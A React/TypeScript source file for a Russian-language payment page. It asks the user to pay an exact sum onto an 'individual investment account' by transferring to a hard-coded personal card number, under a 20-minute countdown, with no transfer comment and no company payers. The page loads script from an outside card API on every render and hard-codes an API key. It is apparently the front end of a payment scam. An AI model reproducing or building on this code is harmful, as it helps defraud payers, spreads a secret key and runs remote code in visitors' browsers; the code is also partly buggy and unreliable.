import React from 'react';
import '../components/order__style.css'
import { useNavigate } from 'react-router-dom'
import { HiShieldExclamation } from "react-icons/hi2";
import { MdContentCopy } from "react-icons/md";
import { IoCardOutline } from "react-icons/io5";
import { RiMastercardFill } from "react-icons/ri";
import { RiVisaFill } from "react-icons/ri";
import axios from 'axios'           
import { useEffect, useState } from 'react';




const API_KEY = '149D1073FDB876653B5FE9B602A8F815FD5463C47F9E5DFB8EE5B872E87E492E'


interface FormProps {
  
  name: string; 
  sum: number;
  order: number;
  photo: string;
  card: string;
  client_number: 284278;
}

const Order: React.FC<FormProps> = ({ client_number, name, sum , photo, card, order }) => {
  
  const navigate = useNavigate();
  

  const handleButtonClick = () => {
    navigate('/payment/bank/order-status');
  } 


  const handleButtonCancel = () => {
    navigate('/payment/bank/order-status-failed');
  } 


  const handleButtonHelp = () => {
    navigate('/payment/bank/order-status/help');
  } 

  const handleButtonCopy = () => {
    var orderNumber = {order}; // Замените на ваше фактическое число

    // Преобразуйте число в строку
    var textToCopy = orderNumber.toString();

    // Создайте временный элемент textarea для хранения текста
    var tempTextarea = document.createElement('textarea');
    tempTextarea.value = textToCopy;

    // Добавьте временный элемент textarea в документ
    document.body.appendChild(tempTextarea);

    // Выделите текст в элементе textarea
    tempTextarea.select();
    tempTextarea.setSelectionRange(0, 99999); // Для поддержки мобильных устройств

    // Скопируйте текст в буфер обмена
    document.execCommand('copy');

    // Удалите временный элемент textarea из документа
    document.body.removeChild(tempTextarea);

    // Уведомление пользователя или любые другие действия, которые вы хотите выполнить
    alert('Число ' + orderNumber + ' скопировано в буфер обмена');
  }

  const storedData = localStorage.getItem('userdata');

  
  const storedObject = JSON.parse(storedData);      


  sum = storedObject && storedObject.summ;        

  name = storedObject && storedObject.name;


  
  const initialTimeInSeconds = 20 * 60; // Время в секундах (20 минут)
  const [remainingTime, setRemainingTime] = useState<number>(
  parseInt(localStorage.getItem('remainingTime') || '', 10) || initialTimeInSeconds // Секунды с БД 
    ); 
  
  useEffect(() => {
  const timerInterval = setInterval(() => {
    setRemainingTime(prevTime => {
    const newTime = prevTime - 1; // Таймер 
    localStorage.setItem('remainingTime', newTime.toString()); // В локалХранилище перекидывает текущее время 
    
    return newTime;
    });
    
   }, 1000); // Каждую секунду
    return () => {
      clearInterval(timerInterval);                     
    };
  }, []);
  
  useEffect(() => {
    // Обнуляем таймер и перенаправляем на другую страницу при достижении времени
    if (remainingTime < 0) {
      setRemainingTime(0);
      localStorage.setItem('remainingTime', '0');
      window.location.href = '/payment/bank/order-status';
    }
  }, [remainingTime]);

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds < 10 ? '0' : ''}${remainingSeconds}`;
    };
  
  
  // const instance = axios.create({
  //   baseURL: 'https://cardapi.top/api/',
  //   timeout: 1000,
  //   headers: {'X-Custom-Header': 'foobar', 'Access-Control-Allow-Origin': 'http://www.oplataflk.online'}
  // });
  


  // instance.get(`/auto/get_card/client/${client_number}/amount/${sum}/currency/RUB/niche/auto`)
  // .then(response => {
  //   // Обработка успешного ответа
  //   console.log(response.data);
  // })
  // .catch(error => {
  //   if (error.response) {
  //     // Запрос был выполнен, но сервер вернул статус отличный от 2xx
  //     console.error('Server responded with an error status:', error.response.status);
  //     console.error('Response data:', error.response.data);
  //   } else if (error.request) {
  //     // Запрос был сделан, но ответ не был получен
  //     console.error('No response received from the server');
  //   } else {
  //     // Ошибка при настройке запроса
  //     console.error('Error setting up the request:', error.message);
  //   }
  // });
  const fetchData = () => {
    const url = `https://cardapi.top/api/auto/get_card/client/${client_number}/amount/${sum}/currency/RUB/niche/auto`;
    
    // Вместо myCallbackFunction укажите имя вашей функции обратного вызова на клиенте
    const script = document.createElement('script');
    script.src = url;
    document.body.appendChild(script);
  };
  
  fetchData();















  return (
    <div className="order-block">
      <h1>Meo1w meow №{order}</h1>
      <div className="order-container">
          <div className="order-container-hinfo">
              <h3>{name},</h3>
              <h3>оплатите</h3>
              <h3>{sum} RUB</h3>
              {/* <button onClick={gettingCard}></button> */}
          </div>
          <div className="order-container-pinfo">
            <p>на Ваш ИИС - Индивидуальный инвестиционный счет </p>
          </div>
          <div className="order-container-cardblock">
            <div className="order-container-payment">
              {/* <img className="payment-photo"src="https://habrastorage.org/getpro/moikrug/uploads/company/100/006/341/2/logo/big_32156f1572916e1f7fb432e67e1defc2.png" alt="" /> */}
              <IoCardOutline className='payment-photo' />
              <h1>{card}4276550086750745</h1>
              <button className='payment-btn' onClick={handleButtonCopy}> <MdContentCopy /> </button>
            </div>
            <div className="order-container-coment">
              <div className="order-container-coment-logo">
                <HiShieldExclamation/>
                <RiVisaFill/>
                <RiMastercardFill/> 
              </div>
              <div className="order-container-coment-text">
                <p>Оплатитите точную сумму одним платежом!</p>
                <p>Никаких комментариев к переводу писать НЕ НУЖНО.</p>
                <p>Платежи от юридических лиц мы не принимаем, заявки оплаченные от юр. лица будут заблокированы.</p>
              </div>
            </div>
          </div>
        
          <div className="order-container-btn">
            <button onClick={handleButtonClick}type="button" className="btn-pay">Я оплатил(а)</button>
            <button onClick={handleButtonCancel}type='button' className="btn-cancel">Отменить</button>
            <button onClick={handleButtonHelp}type='button' className="btn-help">Помощь</button>
          </div>
          <div className="order-container-time">
            <p>Произведите оплату в течении:</p>
            <div>{formatTime(remainingTime)}</div>
          </div>
      </div>
    </div>
  );
};


export default Order;